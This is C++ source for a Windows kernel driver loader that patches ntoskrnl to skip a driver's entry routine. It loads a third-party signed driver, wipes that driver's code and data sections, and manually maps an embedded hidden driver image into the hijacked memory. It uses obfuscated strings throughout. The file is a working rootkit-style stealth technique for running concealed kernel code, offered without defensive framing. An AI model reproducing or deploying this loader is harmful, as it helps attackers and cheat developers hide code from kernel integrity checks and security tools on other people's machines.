#include <ntifs.h>
#include <windef.h>
#include <cstdint>
#include <intrin.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntstrsafe.h>

#include <kernel/defs.h>
#include <kernel/structures.hpp>
#include <kernel/xor.hpp>

#include <impl/communication/structs.h>

#include <impl/imports.h>
#include <impl/scanner.h>
#include <impl/modules.h>
#include <impl/drivers.h>
#include <impl/data.h>
#include <impl/mapper.h>

#define PATCH_LENTH 5

modules::section_data text_section = modules::section_data();
modules::section_data data_section = modules::section_data();



struct EntryInitialize
{
	uintptr_t mappedImageBase{};
	size_t mappedImageSize{};
};

using EntryFuncCall = NTSTATUS(__stdcall*) (EntryInitialize*);

NTSTATUS map_new_driver()
{
	const auto driver_size = sizeof(raw_driver_bytes);

	if (driver_size > text_section.size)
	{
		printf("Driver too big.\n");
		return STATUS_UNSUCCESSFUL;
	}
	
	//ctx::write_protected_address(
	//	reinterpret_cast<void*>(text_section.address),
	//	raw_driver_bytes,
	//	driver_size,
	//	true
	//);

	const auto driverBase = reinterpret_cast<uintptr_t>(ExAllocatePool(NonPagedPool, driver_size));
	if (!driverBase) return STATUS_UNSUCCESSFUL;

	memcpy(reinterpret_cast<void*>(driverBase), reinterpret_cast<void*>(raw_driver_bytes), driver_size);

	mapper::resolve_imports(driverBase);

	const auto dosHeaders = reinterpret_cast<PIMAGE_DOS_HEADER>(driverBase);
	const auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(driverBase + dosHeaders->e_lfanew);

	const PIMAGE_SECTION_HEADER currentImageSection = IMAGE_FIRST_SECTION(ntHeaders);

	for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		auto sectionAddress = reinterpret_cast<void*>(text_section.address + currentImageSection[i].VirtualAddress);

		memcpy(sectionAddress, reinterpret_cast<void*>(driverBase + currentImageSection[i].PointerToRawData), currentImageSection[i].SizeOfRawData);
	}

	mapper::resolve_relocs(driverBase, text_section.address, text_section.address - ntHeaders->OptionalHeader.ImageBase);

	ExFreePool(reinterpret_cast<void*>(driverBase));

	const auto entryParams = reinterpret_cast<EntryInitialize*>(ExAllocatePool(NonPagedPool, sizeof(EntryInitialize)));
	if (!entryParams)
	{
		return STATUS_UNSUCCESSFUL;
		return 0;
	}

	entryParams->mappedImageBase = text_section.address;
	entryParams->mappedImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	EntryFuncCall mappedEntryPoint = reinterpret_cast<EntryFuncCall>(text_section.address + ntHeaders->OptionalHeader.AddressOfEntryPoint);

	return mappedEntryPoint(entryParams);
}

NTSTATUS manual_mapped_entry(PVOID a1, PVOID a2)
{
	const auto ntoskrnl = modules::get_kernel_module(skCrypt("ntoskrnl.exe"));
	if (!ntoskrnl)
	{
		printf("Couldnt find ntoskrnl.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Ntoskrnl base: 0x%llx\n", ntoskrnl.address);

	const auto calldrv_address = scanner::find_pattern(ntoskrnl.address, "\xE8\x00\x00\x00\x00\x44\x8B\xF0\x85\xC0\x78\x15", "x????xxxxxxx");
	if (!calldrv_address)
	{
		printf("Invalid pattern.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("PnpCallDriverEntry address: 0x%llx\n", calldrv_address);

	const auto original_bytes = reinterpret_cast<uint8_t*>(imports::ex_allocate_pool(NonPagedPool, PATCH_LENTH));
	if (!original_bytes)
	{
		printf("Failed to allocate buffer.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Original bytes buffer: 0x%llx\n", (reinterpret_cast<uintptr_t>(original_bytes)));

	// Patch IopLoadDriver to not call driver entry
	ctx::nop_address_range(calldrv_address, PATCH_LENTH, original_bytes);

	// Load driver to exploit
	if (!modules::load_vurn_driver(skCrypt(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\drv1")))
	{
		printf("Couldnt load driver.\n");
		ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
		imports::ex_free_pool_with_tag(original_bytes, 0);
		return STATUS_UNSUCCESSFUL;
	}
	printf("Loaded vurnable driver.\n");
	
	// Restore bytes
	ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
	imports::ex_free_pool_with_tag(original_bytes, 0);

	printf("Restored original bytes.\n");

	const auto vurn_driver = modules::get_kernel_module(skCrypt("PaladinDriver.sys"));
	if (!vurn_driver)
	{
		printf("Couldnt find vurnable driver.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Vurnable driver base: 0x%llx\n", vurn_driver.address);

	text_section = modules::find_section(vurn_driver.address, skCrypt(".text"));
	if (!text_section) 
	{
		printf("Text section is invalid.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Text section size: 0x%llx\n", text_section.size);
	printf("Text section base: 0x%llx\n", text_section.address);

	data_section = modules::find_section(vurn_driver.address, skCrypt(".data"));
	if (!data_section)
	{
		printf("Data section is invalid.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Data section size: 0x%llx\n", data_section.size);
	printf("Data section base: 0x%llx\n", data_section.address);

	// Zero .text section
	ctx::zero_address_range(text_section.address, text_section.size);

	// Zero .data section
	ctx::zero_address_range(data_section.address, data_section.size);

	return map_new_driver();
}